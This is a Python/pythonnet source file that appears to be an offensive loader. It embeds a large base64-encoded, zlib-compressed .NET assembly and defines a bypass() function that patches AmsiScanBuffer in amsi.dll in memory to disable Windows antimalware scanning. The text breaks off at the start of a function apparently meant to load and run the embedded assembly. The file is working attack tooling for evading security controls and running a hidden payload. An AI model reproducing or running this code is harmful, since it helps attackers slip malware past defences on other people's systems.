import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
